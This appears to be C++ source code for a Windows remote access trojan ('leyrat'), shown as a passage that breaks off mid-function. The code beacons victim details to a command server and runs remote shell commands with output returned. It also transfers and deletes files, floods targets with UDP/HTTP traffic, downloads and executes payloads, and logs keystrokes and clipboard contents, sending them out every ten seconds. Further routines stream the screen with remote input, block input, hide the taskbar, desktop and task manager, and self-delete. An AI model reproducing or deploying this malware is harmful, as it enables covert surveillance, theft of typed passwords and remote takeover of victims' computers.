
#pragma once

//#define NO_ACK_SERVER
#include "leyrat.h"

#include <Windows.h>
#include <Mmsystem.h>
#include <stdlib.h>
#include <cstdio>
#include <math.h>


#include "leybuf.h"
#include "leynet.h"



#include "aviUtil.h"

#ifndef DEBUG
#define printf(...) {}
#endif

leynet_udp net;

#define _VERSION 1

#define NETBUFFER_SIZE 2000

unsigned short serverport = 27065;
unsigned short screenshareport = serverport + 1;
unsigned short filetransferport = serverport + 2;

char serveraddress[25];

struct dossettings
{

	unsigned int time;
	unsigned int port;
	
	bool is_http;

	char addr[150];

	char pkg[255];
	unsigned char pkglen;

};

struct httpdlsettings
{
	char addr[255];
	char file[255];
	char store[255];

	bool dling;
	bool rundl;
	bool updatedl;

};

struct tcpfilesettings
{
	char file[255];

	bool uploading;
	bool downloading;
	bool downloading_isupdate;
};

struct streamsettings
{
	unsigned char fps;

	int width;
	int height;

};



bool hide_taskmgr = false;
bool hide_taskbar = false;
bool hide_desktop = false;

bool keyboardblock = false;
bool mouseblock = false;

dossettings doscfg;
httpdlsettings httpdlcfg;
tcpfilesettings tcpfcfg;
streamsettings streamcfg;

int GetLocalName(LPWSTR buf, int bufsize)
{
	int localinfo1 = GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, bufsize);

	if (localinfo1)
	{
		bufsize -= localinfo1;
		if (bufsize < 1)
			return 0;

		buf += --bufsize;
		*buf++ = '-';
		*buf = 0;

		return GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, bufsize);
	}
	return 0;
}

int ackserver(const char *ip)
{
#ifdef NO_ACK_SERVER
	return 0;
#endif

	char username[256];
	char clanguage[100];

	unsigned long username_len = 256;
	GetUserName(username, &username_len);

	
	wchar_t* localename = new wchar_t[100];
	memset(localename, 0, 100);

	GetLocalName(localename, 50);

	//WideCharToMultiByte(CP_UTF8, 0, localename, username_len, NULL, 0, NULL, NULL);
	WideCharToMultiByte(CP_UTF8, 0, localename, username_len, clanguage, 100, NULL, NULL);

	free( localename );

	unsigned long diskserial;
	GetVolumeInformationA(NULL, NULL, NULL, &diskserial, NULL, NULL, NULL, NULL);



	DWORD len = MAX_COMPUTERNAME_LENGTH;
	char computername[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	GetComputerName(computername, &len);
	
	char*windowsedition = "Windows notaddedyet version";

	unsigned long replylen = 2 + 1 + 4 + 4 + + 4+ strlen(clanguage) + username_len + strlen(computername) + strlen(windowsedition);

	char *reply = new char[replylen];

	leybuf buf(reply, replylen);
	buf.WriteString("\xDB\xDB", true);

	buf.WriteChar('a');

	buf.WriteInt32(_VERSION);
	buf.WriteInt32(diskserial);

	buf.WriteString(clanguage);
	buf.WriteString(username);
	buf.WriteString(computername);
	buf.WriteString(windowsedition);

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());

	free(reply);

	printf("Acknowledged Server! __ %i\n", buf.GetPos());


	return 0;
}

int ackserveract(char *ip, char*type)
{

	char reply[100];

	leybuf buf(reply, sizeof(reply));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('_');
	buf.WriteString(type);

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());

	printf("Acknowledged Act: %s!\n", type);

	return 0;
}

int replyruncmd(char *ip, char*rancmd)
{
	char*reply = new char[3 + strlen(rancmd) + 2];

	leybuf buf(reply, 3 + strlen(rancmd) + 2);
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('b');
	buf.WriteString(rancmd);

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());

	printf("Sent rancmd: %s\n", rancmd);

	free(reply);

	return 0;
}

int listfiles(char *ip, const char*dir)
{

	unsigned int replylen = 3 + strlen(dir) + 1 + (256*100);

	char *reply = new char[replylen];

	memset(reply, 0, replylen);

	leybuf buf(reply, replylen);
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('c');
	buf.WriteString(dir);

	WIN32_FIND_DATA data;

	void*file = FindFirstFile(dir, &data);
	int numfiles = 0;


	char*tmpname = new char[256];

	if (file != INVALID_HANDLE_VALUE)
	{

		do
		{
			size_t namelen = strlen(data.cFileName);

			if (namelen > 254)
				continue;

			memset(tmpname, 0, 256);
			memcpy(tmpname, data.cFileName, namelen);

			if (!buf.WriteString(tmpname))
				break;

			numfiles++;

		} while (FindNextFile(file, &data));

		FindClose(file);
	}

	free(tmpname);



	printf("Sent file list, files in %s[%i]!\n", dir, numfiles);

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());
	free(reply);

	return 0;
}

int recvfromthink()
{

	char *netrecbuffer = new char[NETBUFFER_SIZE];
	memset(netrecbuffer, 0, NETBUFFER_SIZE);
	
	int msgsize = 0;

	char charip[25];
	unsigned short port = 1;
	net.Receive(&msgsize, netrecbuffer, NETBUFFER_SIZE, charip, port);
	
	if (!msgsize)
	{
		free(netrecbuffer);
		return 0;
	}


	leybuf buf(netrecbuffer, msgsize);

	if (buf.ReadChar() != '\xDB' || buf.ReadChar() != '\xDB')
	{
		printf("unknown pkg from:%s!\n", charip);
		printf("upkg__%i:: %s\n", msgsize, netrecbuffer);

		free(netrecbuffer);
		return 0;
	}

	printf("Received pkg from server!\n");


	char type = buf.ReadChar();

	if (type == 'a')//acknowledge server
	{

		ackserver(charip);

		memset(serveraddress, 25, 0);
		strcpy(serveraddress, charip);
		serverport = port;
	}


	if (type == 'b')//run cmd
	{
		int show = (int)buf.ReadChar();
		int response = (int)buf.ReadChar();

		char cmd[300];
		buf.ReadString(cmd, sizeof(cmd));

		if (!response)
		{
			WinExec(cmd, show);
			return ackserveract(charip, "b");
		}

		SECURITY_ATTRIBUTES SA = { 0 };
		SA.nLength = sizeof(SECURITY_ATTRIBUTES);
		SA.bInheritHandle = TRUE;

		HANDLE hnewStdOutputR = 0;
		HANDLE hnewStdOutputW = 0;

		if (!CreatePipe(&hnewStdOutputR, &hnewStdOutputW, &SA, 0))
		{
			char err[25];
			sprintf(err, "PIP _ %d\n", GetLastError());
			return replyruncmd(charip, err);
		}

		if (!SetHandleInformation(hnewStdOutputR, HANDLE_FLAG_INHERIT, 0))
		{
			CloseHandle(hnewStdOutputR);
			CloseHandle(hnewStdOutputW);

			char err[25];
			sprintf(err, "SHI _ %d\n", GetLastError());
			return replyruncmd(charip, err);
		}

		STARTUPINFO      SI = { 0 };
		SI.cb = sizeof(STARTUPINFO);
		SI.dwFlags |= STARTF_USESTDHANDLES;
		SI.hStdOutput = hnewStdOutputW;
		SI.hStdError = hnewStdOutputW;
		SI.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

		char runcmd[300 + 20];
		sprintf(runcmd, "cmd /C chcp 65001 & %s", cmd);
		
		PROCESS_INFORMATION PI = { 0 };
		if (!CreateProcess(0, runcmd, NULL, NULL, 1, 0, NULL, NULL, &SI, &PI))
		{
			CloseHandle(hnewStdOutputR);
			CloseHandle(hnewStdOutputW);

			char err[25];
			sprintf(err, "CP _ %d\n", GetLastError());
			return replyruncmd(charip, err);
		}

		// Wait until child process exits.
		WaitForSingleObject(PI.hProcess, 1000);
		unsigned long bytesread = 0;

		char*fullconoutput = new char[0xFFFF];
		memset(fullconoutput, 0, 0xFFFF);

		int success = 0;

		for (int i = 0; i < 5; i++)
		{
			unsigned long available = 0;
			if (!PeekNamedPipe(hnewStdOutputR, NULL, 0, NULL, &available, NULL))
			{
				continue;
			}

			if (!available)
				continue;


			success = ReadFile(hnewStdOutputR, fullconoutput, 0xFFFF - 20, &bytesread, NULL);

		}


		if (!success)
		{
			sprintf(fullconoutput, "!SC _ %d\n", GetLastError());
		}

		replyruncmd(charip, fullconoutput);

		TerminateProcess(PI.hProcess, -1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		CloseHandle(hnewStdOutputR);
		CloseHandle(hnewStdOutputW);

		free(fullconoutput);

		return 0;
	}

	if (type == 'c')//list files
	{
		char directory[256];
		buf.ReadString(directory, sizeof(directory));


		listfiles(charip, directory);
	}

	if (type == 'd')//download file
	{
		char is_update = (char)buf.ReadChar();

		char filename[256];
		buf.ReadString(filename, 256);


		strcpy(tcpfcfg.file, filename);

		if (is_update)
			tcpfcfg.downloading_isupdate = true;

		tcpfcfg.downloading = true;
		tcpfcfg.uploading = false;

		ackserveract(charip, "d");//download
	}

	if (type == 'e')//upload file
	{
		char filename[256];
		buf.ReadString(filename, sizeof(filename));


		strcpy(tcpfcfg.file, filename);

		tcpfcfg.downloading = false;
		tcpfcfg.uploading = true;

		ackserveract(charip, "e");//download
	}

	if (type == 'g')//dos
	{

		memset(&doscfg, 0, sizeof(dossettings));
		
 
		unsigned int time = buf.ReadInt32();

		if (time == 0)
		{
			free(netrecbuffer);
			return 0;
		}

		doscfg.is_http = buf.ReadChar()==0;

	
		buf.ReadString(doscfg.addr, 150);
		doscfg.port = buf.ReadInt32();
		doscfg.pkglen = buf.ReadChar();
		buf.ReadBytes(doscfg.pkg, doscfg.pkglen);

		doscfg.time = time;
		ackserveract(charip, "g");
	}

	if (type == 'j')//screenshare
	{
		
		unsigned char fps = buf.ReadChar();
		int width = buf.ReadInt32();
		int height = buf.ReadInt32();

		if (fps == 0)
		{
			streamcfg.fps = 0;
			printf("End stream!\n");
			
			free(netrecbuffer);
			return ackserveract(charip, "j");
		}

		streamcfg.fps = 0;
		Sleep(2000);

		char preset[50];
		buf.ReadString(preset, 50);

		char line[50];
		buf.ReadString(line, 50);

		int x1, y1, x2, y2, screenwidth, screenheight;

		// get screen dimensions
		x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
		y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
		x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
		y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
		screenwidth = x2 - x1;
		screenheight = y2 - y1;

		if (width>screenwidth)
			width = screenwidth;

		if (height > screenheight)
			height = screenheight;

		streamcfg.width = width;
		streamcfg.height = height;

		START_ENCODING(preset, line, streamcfg.width, streamcfg.height, fps);

		streamcfg.fps = fps;

		printf("Start Stream: %s __ %lu __ %lu __ %lu", preset, fps, streamcfg.width, streamcfg.height);

		ackserveract(charip, "j");
	}

	if (type == 'l')//screenshare input
	{
		char ismouse = buf.ReadChar();

		if (ismouse)
		{

			int x = buf.ReadInt32();
			int y = buf.ReadInt32();
			int type = buf.ReadInt32();
			int data = buf.ReadInt32();

			SetCursorPos(x, y);
			
			INPUT    Input = { 0 };
			// left down 
			Input.type = INPUT_MOUSE;
			Input.mi.dx = x;
			Input.mi.dy = y;
			Input.mi.dwFlags = type;
			Input.mi.mouseData = data;

			SendInput(1, &Input, sizeof(INPUT));


			printf("Received Screenshare mouse input %i:%i!\n", x, y );

			free(netrecbuffer);
			return ackserveract(charip, "l1");

		}

		int keystrokes = buf.ReadChar();

		for (int i = 0; i < keystrokes; i++)
		{
			int vkkey = buf.ReadChar();
			int flags = buf.ReadChar();

			keybd_event(vkkey, MapVirtualKey(vkkey, 0), flags, 0);
			printf("KEY: %i __ FLAGS: %i\n", vkkey, flags);
		}



		
		printf("Received Screenshare input!\n");
		ackserveract(charip, "l");
	}

	if (type == '1')// http update/download/dl&execute
	{


		buf.ReadString(httpdlcfg.addr, 255);//what host to dl from
		buf.ReadString(httpdlcfg.file, 255);//where at the host is it stored
		buf.ReadString(httpdlcfg.store, 255);//where should we save it

		char extras = buf.ReadChar();

		if (extras == 1)
			httpdlcfg.rundl = true;

		if (extras == 2)
			httpdlcfg.updatedl = true;

		httpdlcfg.dling = true;

		printf("Start DL: %s%s store: %s __ updatedl: %x\n", httpdlcfg.addr, httpdlcfg.file, httpdlcfg.store, httpdlcfg.updatedl);

		ackserveract(charip, "1");
	}

	if (type == '2')//suicide
	{
		ackserveract(charip, "2");
		Sleep(10);
		

		TCHAR szFile[MAX_PATH], szCmd[MAX_PATH+20];
		GetModuleFileName(NULL, szFile, MAX_PATH);

		sprintf(szCmd, "/c del %s >> NUL", szFile);

		if (GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0 && WinExec(szCmd, SW_HIDE))
		{
			ExitProcess(-1);
		}

	}

	if (type == '3')//input block
	{
		ackserveract(charip, "3");

		if (buf.ReadChar() != '\0')
		{
			keyboardblock = buf.ReadChar() != '\0';
		}else{
			mouseblock = buf.ReadChar() != '\0';
		}

	}


	if (type == '4')//task mgr
	{
		ackserveract(charip, "4");

		hide_taskmgr = buf.ReadChar() != '\0';
	}

	if (type == '5')//task bar
	{
		ackserveract(charip, "5");

		hide_taskbar = buf.ReadChar() != '\0';
	}


	if (type == '6')//desktop
	{
		ackserveract(charip, "6");

		hide_desktop = buf.ReadChar() != '\0';
	}


	if (type == '7')//disk tray 
	{
		ackserveract(charip, "7");

		bool open = buf.ReadChar() != '\0';

		if (open)
		{
			mciSendString("set cdaudio door open", 0, 0, 0);
		}else{
			mciSendString("set cdaudio door closed", 0, 0, 0);
		}
	}

	if (type == '8')//download file
	{
		char filename[256];
		buf.ReadString(filename, 256);
		DeleteFile(filename);

		ackserveract(charip, "8");//download
	}

	free(netrecbuffer);

	return 0;
}


int ackserverthread()
{

	while (true)
	{
		ackserver(serveraddress);
		//Sleep(60000);
		Sleep(10000);

	}

	return 0;
}


int dosthread()
{
	leynet_udp *udp = new leynet_udp;
	leynet_tcp *tcp = new leynet_tcp;

	SYSTEMTIME st;
	GetSystemTime(&st);
	

	udp->Start();
	tcp->Start();
	
	int ms = 0;

	while (true)
	{

		Sleep(1);

		if (!doscfg.time)
		{
			tcp->CloseConnection();
			udp->CloseSocket();
			Sleep(100);
			continue;
		}
		ms++;

		if (ms == 1000)
		{
			ms = 0;
			doscfg.time--;

		}

		printf("DOSING: %s, port: %i | pkglen: %lu\n", doscfg.addr, doscfg.port, doscfg.pkglen);

		if (!doscfg.is_http)
		{

			if (!udp->GetPort())
			{
				udp->OpenSocket(37056 + st.wMilliseconds);
				udp->SetNonBlocking(true);
			}

			udp->SendTo(doscfg.addr, doscfg.port, doscfg.pkg, doscfg.pkglen);
			//httpdos
			continue;
		}

		if (!tcp->GetPort())
		{
			tcp->OpenConnection(doscfg.addr, doscfg.port);
			tcp->SetNonBlocking(true);
		}

		tcp->HTTPGet(doscfg.pkg);



		//dos
	}

	return 0;
}


static leynet_tcp *tcp_temp;
// static void *penis; //decltype(leynet_tcp::TLenFin) penis = &leynet_tcp::TLenFin;



int httpdownloadthread()
{




	leynet_tcp *tcp = new leynet_tcp;
	tcp->Start();

	char*buf = 0;

	while (1)
	{
		Sleep(100);

		if (!httpdlcfg.dling)
		{
			if (buf)
			{
				free(buf);
				buf = 0;
			}
			tcp->CloseConnection();
			continue;
		}



		tcp->OpenConnection(httpdlcfg.addr, 80);
		tcp->HTTPGet(httpdlcfg.file);


		tcp_temp = tcp;
		tcp_temp->timefin = 10;


		buf = new char[50000000];
		int size = 0;
		tcp->Receive(&size, buf, 50000000, [](unsigned int a, unsigned int b, char *c, char*d) -> bool
		{
			return tcp_temp->THTTPLenFin(a, b, c, d);
		});

		tcp->HTTPParse(&size, buf);

		if (!size)
		{
			tcp->CloseConnection();
			httpdlcfg.dling = false;
			continue;
		}

		printf("HTTP Download\n");


		char absfile[MAX_PATH];

		if (httpdlcfg.updatedl)
		{
			

			GetModuleFileName(NULL, absfile, MAX_PATH);
			memset(httpdlcfg.store, 0, 255);
			strcpy(httpdlcfg.store, absfile);

			DeleteFile("C:\\ab");

			MoveFile(absfile, "C:\\ab");
			Sleep(100);

		}

		HANDLE file = CreateFile(httpdlcfg.store, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (!file)
		{
			return 0;
		}

		unsigned long written;

		int wrotefile = WriteFile(file, buf, size, &written, 0);

		if (!wrotefile)
		{
			return 0;
		}

		printf("wrote file: %s\n", httpdlcfg.store);

		CloseHandle(file);


		if (httpdlcfg.rundl)
		{
			WinExec(httpdlcfg.store, 0);
		}

		if (httpdlcfg.updatedl)
		{
			printf("Updating!\n");

			net.CloseSocket();
			tcp->CloseConnection();

			WinExec(absfile, 0);

			Sleep(1000);

			TCHAR szFile[MAX_PATH], szCmd[MAX_PATH+20];
			strcpy(szFile, "C:\\ab");
			sprintf(szCmd, "/c del %s >> NUL", szFile);

			if (GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0 && WinExec(szCmd, SW_HIDE))
			{
				ExitProcess(-1);
			}


		}

		tcp->CloseConnection();

		httpdlcfg.dling = false;

	}
	return 0;
}

int tcpfilethread()
{


	leynet_tcp *tcp = 0;

	while (1)
	{
		Sleep(10);

		if (!tcpfcfg.uploading&&!tcpfcfg.downloading)
		{

			if (tcp)
			{
				tcp->CloseConnection();
				free(tcp);
				tcp = 0;
			}

			continue;
		}


		tcp = new leynet_tcp;

		tcp->Start();

		if (tcp->OpenConnection(serveraddress, filetransferport))
		{
			printf("file transfer failed, no tcp server!\n");
			continue;
		}


		if (tcpfcfg.uploading)
		{


			tcpfcfg.uploading = false;
			tcpfcfg.downloading = false;


			HANDLE file = CreateFile(tcpfcfg.file, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);

			if (!file)
			{
				if(file)
					CloseHandle(file);

				char reply[5];

				leybuf buf(reply, sizeof(reply));
				buf.WriteString("\xDB\xDB", true);
				buf.WriteChar('e');

				net.SendTo(serveraddress, serverport, reply, 3);
				printf("Error while uploading file!\n");
				continue;
			}

			printf("Reading file: %s\n", tcpfcfg.file);

			char *filebuffer = new char[5002];


			OVERLAPPED *overlapped = new OVERLAPPED;
			memset(overlapped, 0, sizeof(OVERLAPPED));

			overlapped->Offset = 0;
			overlapped->OffsetHigh = 0;
			overlapped->hEvent = 0;


			unsigned long filesize_high = 0;
			unsigned long filesize = GetFileSize(file, &filesize_high);
			

			unsigned long long ownoffset = 0;
			unsigned long bytesread = 0;


			while (1)
			{

				memset(filebuffer, 0, 5002);

				ReadFile(file, filebuffer, 5002 - 2, 0, overlapped);

				GetOverlappedResult(file, overlapped, &bytesread, true);



				ownoffset += bytesread;

				overlapped->OffsetHigh = ((ownoffset >> 32) & 0xFFFFFFFF);
				overlapped->Offset = (ownoffset & 0xFFFFFFFF);


				printf("OFFSET: %lu%lu \n", overlapped->OffsetHigh, overlapped->Offset);

				if (tcp->Send(filebuffer, bytesread))
					break;

				if (GetLastError() == ERROR_HANDLE_EOF)
					break;

				if (overlapped->Offset >= filesize)
				{
					if (!filesize_high)
						break;

					if (overlapped->OffsetHigh >= filesize_high)
					{
						break;
					}
				}
			}

			free(overlapped);
			free(filebuffer);
			CloseHandle(file);

			tcp->Send("\xFF\xFA\xFB\xFD\xFC\xFB\xBB\xAA\xDD", 9);

			printf("Uploaded file: %s!\n", tcpfcfg.file);

			continue;
		}

		//downloading

		printf("Downloading: %s\n", tcpfcfg.file);

		static HANDLE filehandle = 0;


		char absfile[MAX_PATH+1] = { 0 };

		if (tcpfcfg.downloading_isupdate)
		{
			GetModuleFileName(NULL, absfile, MAX_PATH);
			strcpy(tcpfcfg.file, absfile);

			MoveFile(absfile, "C:/ab");
			Sleep(100);
		}

		filehandle = CreateFile(tcpfcfg.file, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);

		if (!filehandle)
		{
			printf("couldnt create file!\n");

			tcpfcfg.uploading = false;
			tcpfcfg.downloading = false;
			continue;
		}

		static OVERLAPPED *overlapped;
		overlapped = new OVERLAPPED;
		memset(overlapped, 0, sizeof(OVERLAPPED));

		overlapped->Offset = 0;
		overlapped->OffsetHigh = 0;
		overlapped->hEvent = 0;

		static unsigned long long lastrectime;
		static unsigned long long byteswritten;

		lastrectime = GetTickCount64();
		byteswritten = 0;

		int size = 0;

		tcp->Receive(&size, 0, 0xFFFFFF, [](unsigned int datalen, unsigned int curdatalen, char*buffer, char*curbuffer) -> bool
		{
			if (!tcpfcfg.downloading)
			{
				printf("not downloading\n");
				return true;
			}

			unsigned long long curtime = GetTickCount64();
			unsigned long long msdiff = curtime- lastrectime;

			if (false&&msdiff>7*1000)
			{
				printf("timeout\n");
				return true;
			}

			if (!curdatalen)
				return false;

			lastrectime = GetTickCount64();


			printf("RECEIVING CHUNK LEN: %lu\n", curdatalen);

			unsigned long tmpbyteswritten = 0;
			if (curdatalen >= 9)
			{


				leybuf checkend(curbuffer, curdatalen);
				checkend.SetPos(curdatalen - 9);

				char end[10];
				checkend.ReadBytes(end, 9);

				if (!memcmp(end, "\xFF\xFA\xFB\xFD\xFC\xFB\xBB\xAA\xDD", 9))
				{
					WriteFile(filehandle, curbuffer, curdatalen - 9, 0, overlapped);
					GetOverlappedResult(filehandle, overlapped, &tmpbyteswritten, true);

					byteswritten += curdatalen - 9;
					overlapped->OffsetHigh = ((byteswritten >> 32) & 0xFFFFFFFF);
					overlapped->Offset = (byteswritten & 0xFFFFFFFF);
					printf("EOF\n");
					return true;
				}

			}

			WriteFile(filehandle, curbuffer, curdatalen, 0, overlapped);
			GetOverlappedResult(filehandle, overlapped, &tmpbyteswritten, true);

			byteswritten += curdatalen;
			overlapped->OffsetHigh = ((byteswritten >> 32) & 0xFFFFFFFF);
			overlapped->Offset = (byteswritten & 0xFFFFFFFF);

			return false;
		});


		CloseHandle(filehandle);

		free( overlapped );

		lastrectime = 0;
		overlapped = 0;
		filehandle = 0;

		tcpfcfg.uploading = false;
		tcpfcfg.downloading = false;

		if (tcpfcfg.downloading_isupdate)
		{
			WinExec(absfile, 0);

			Sleep(1000);

			TCHAR szFile[MAX_PATH], szCmd[MAX_PATH + 20];
			strcpy(szFile, "C:\\ab");
			sprintf(szCmd, "/c del %s >> NUL", szFile);

			if (GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0 && WinExec(szCmd, SW_HIDE))
			{
				ExitProcess(-1);
			}
		}
	}

	return 0;
}

bool shift = false;
bool caps = false;

char* ClipBoard = 0;
char* WindowName = 0;
char* KeyLog = 0;


HWND oldwin = 0;
leybuf* WriteKeyLog = 0;

void logclipboard()
{
	BOOL openclipboard = OpenClipboard(0);

	if (openclipboard)
	{
		HANDLE datahandle = GetClipboardData(CF_TEXT);

		if (datahandle)
		{


			char*data = (char*)GlobalLock(datahandle);

			if (data&&strcmp(data, ClipBoard))
			{
				memset(ClipBoard, 300, 0);

				unsigned int l = strlen(data);

				if (l >= 300)
					l = 299;

				memcpy(ClipBoard, data, l);
				ClipBoard[l] = 0;

				char tmpclip[350];

				sprintf(tmpclip, "[C]%s[/C]", ClipBoard);
				WriteKeyLog->WriteString(tmpclip, true);


			}

			GlobalUnlock(datahandle);

		}

		CloseClipboard();
	}
}

int keylogthread()
{
	ClipBoard = new char[300];
	WindowName = new char[300];
	KeyLog = new char[70000];

	memset(WindowName, 300, 0);
	memset(ClipBoard, 300, 0);
	memset(KeyLog, 70000, 0);

	WriteKeyLog = new leybuf(KeyLog, 70000, 0);

	while (1)
	{
		logclipboard();
		if (!oldwin||oldwin != GetForegroundWindow())
		{
			oldwin = GetForegroundWindow();
			memset(WindowName, 300, 0);

			char tmpwin[260];

			GetWindowText(oldwin, tmpwin, 260);
			sprintf(WindowName, "\n===== %s =====\n", tmpwin);
			WriteKeyLog->WriteString(WindowName, true);


		}
		if (GetAsyncKeyState(VK_CAPITAL) & 1)
		{
			caps = !caps;
			//WriteKeyLog->WriteString("\x01", true);

		}

		if (GetAsyncKeyState(VK_SHIFT))
		{
			if (!shift)
			{
				//WriteKeyLog->WriteString("\x01", true);
				shift = true;
			}
		}else {
			if (shift)
			{
				//WriteKeyLog->WriteString("\x01", true);
				shift = false;
			}

		}

		if (GetAsyncKeyState(VK_CONTROL) & 1)
		{
			WriteKeyLog->WriteString("~", true);

		}

		if (GetAsyncKeyState(VK_MENU) & 1)
		{
			WriteKeyLog->WriteString("|", true);
		}

		if (GetAsyncKeyState(VK_TAB) & 1)
		{
			WriteKeyLog->WriteString("\t", true);
		}

		if (GetAsyncKeyState(VK_RETURN) & 1)
		{
			WriteKeyLog->WriteString("\n", true);//used to be {R}
		}

		if (GetAsyncKeyState(VK_BACK) & 1)
		{
			WriteKeyLog->SetPos(WriteKeyLog->GetPos() - 1);
		}

		if (GetAsyncKeyState(VK_OEM_PERIOD) & 1)
		{
			WriteKeyLog->WriteString(".", true);
		}

		if (GetAsyncKeyState(VK_OEM_COMMA) & 1)
		{
			WriteKeyLog->WriteString(",", true);
		}

		if (GetAsyncKeyState(VK_OEM_PLUS) & 1)
		{
			WriteKeyLog->WriteString("+", true);
		}

		if (GetAsyncKeyState(VK_OEM_MINUS) & 1)
		{
			WriteKeyLog->WriteString("-", true);
		}

		if (GetAsyncKeyState(VK_SPACE) & 1)
		{
			WriteKeyLog->WriteString(" ", true);
		}

		for (int i = 'A'; i <= 'Z'; i++)
		{


			if (GetAsyncKeyState(i) &1)
			{
				if (!shift&&!caps||caps&&shift)
				{
					i = i + 32;
					WriteKeyLog->WriteChar(i);
				}
				else {
					WriteKeyLog->WriteChar(i);
				}
					
			}
		}

		for (int i = '0'; i <= '9'; i++)
		{


			if (GetAsyncKeyState(i) & 1)
			{
				if (!shift&&!caps || caps&&shift)
				{
					WriteKeyLog->WriteChar(i);
				}
				else {

					i = i - 16;
					WriteKeyLog->WriteChar(i);
				}

			}
		}

		Sleep(5);

		
	}

	return 0;
}

int keylogsendthread()
{
	while (1)
	{

		Sleep(10000);

		if (!WriteKeyLog)
			continue;

		int logsize = WriteKeyLog->GetPos();

		if (logsize == 0)
			continue;

		char *reply = new char[logsize + 10];
		leybuf buf(reply, logsize + 10);

		buf.WriteString("\xDB\xDB", true);

		buf.WriteChar('!');
		buf.WriteInt32(logsize);
		buf.WriteBytes(WriteKeyLog->GetData(), logsize);//the keylog

	//	printf("LOL: %s\n", WriteKeyLog->GetData());
		net.SendTo(serveraddress, serverport, reply, buf.GetPos());
		free(reply);



		WriteKeyLog->SetPos(0);

	}

	return 0;
}



void capturescreen(leynet_tcp *tcp)
{
	HDC hdc = CreateDC("DISPLAY", NULL, NULL, NULL);
	if (!hdc)
		return;

	HDC memhdc = CreateCompatibleDC(hdc);

	int x1, y1, x2, y2, screenwidth, screenheight;

	// get screen dimensions
	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	screenwidth = x2 - x1;
	screenheight = y2 - y1;

	BITMAPINFO livebmpinfo = { 0 };
	livebmpinfo.bmiHeader.biSize = sizeof(livebmpinfo.bmiHeader);
	livebmpinfo.bmiHeader.biWidth = streamcfg.width;
	livebmpinfo.bmiHeader.biHeight = streamcfg.height;
	livebmpinfo.bmiHeader.biPlanes = 1;
	livebmpinfo.bmiHeader.biBitCount = 24;
	livebmpinfo.bmiHeader.biCompression = BI_RGB;
	livebmpinfo.bmiHeader.biSizeImage = streamcfg.height * 4 * (((streamcfg.width * livebmpinfo.bmiHeader.biBitCount) + 0x1F) / 0x20);


	char*rawimg;
	HBITMAP hbmp = CreateDIBSection(memhdc, &livebmpinfo, DIB_RGB_COLORS, (void**)(&rawimg), NULL, NULL);

	if (!hbmp)
	{
		DeleteObject(memhdc);
		return;
	}
	SelectObject(memhdc, hbmp);

	BitBlt(memhdc, 0, 0, screenwidth, screenheight, hdc, 0, 0, SRCCOPY);

	SetStretchBltMode(memhdc, STRETCH_HALFTONE);
	StretchBlt(memhdc, 0, streamcfg.height, streamcfg.width, -streamcfg.height, hdc, 0, 0, screenwidth, screenheight, SRCCOPY);

	/*
	BITMAPFILEHEADER hdr = { 0 };
	hdr.bfType = 'MB';
	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + livebmpinfo.bmiHeader.biSizeImage);
	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);


	FILE*wrote = fopen("nig.bmp", "wb");
	fwrite(&hdr, sizeof(char), sizeof(BITMAPFILEHEADER), wrote);
	fwrite(&livebmpinfo.bmiHeader, sizeof(char), sizeof(BITMAPINFOHEADER), wrote);
	fwrite(rawimg, sizeof(char), livebmpinfo.bmiHeader.biSizeImage, wrote);
	fclose(wrote);
	*/
	unsigned int bufsize = livebmpinfo.bmiHeader.biSizeImage;

	for (unsigned int i = 0; i < bufsize; i++)
	{
		unsigned char b = (unsigned char)rawimg[i];
		unsigned char g = (unsigned char)rawimg[i + 1];
		unsigned char r = (unsigned char)rawimg[i + 2];

		rawimg[i] = r;
		rawimg[i + 1] = g;
		rawimg[i + 2] = b;
		i = i + 2;
	}

	char cheader[40];
	leybuf header(cheader, sizeof(cheader));
	header.WriteString("\xDB\xDB", true);
	header.WriteChar('j');
	header.WriteInt32(streamcfg.width);
	header.WriteInt32(streamcfg.height);
	header.WriteInt32(screenwidth);
	header.WriteInt32(screenheight);

	if (tcp->Send(cheader, header.GetPos())||ADD_FRAME(tcp, rawimg, streamcfg.width, streamcfg.height, bufsize, 30, 10000)||tcp->Send("\xFF\xFA\xFB\xFD\xFC\xFB\xBB\xAA\xDD", 9))
	{
		streamcfg.fps = 0;
		printf("END SCREENSHARE __ ERROR WHILE SENDING!\n");

		DeleteObject(hbmp);
		DeleteObject(memhdc);
		DeleteObject(hdc);

		return;
	}

	DeleteObject(hbmp);
	DeleteObject(memhdc);
	DeleteObject(hdc);



}

unsigned int curframes = 0;

int screensharethread()
{
	

	leynet_tcp *tcp = 0;

	SYSTEMTIME lasttime;
	GetSystemTime(&lasttime);

	while (true)
	{

		if (!streamcfg.fps)
		{
			if (tcp)
			{
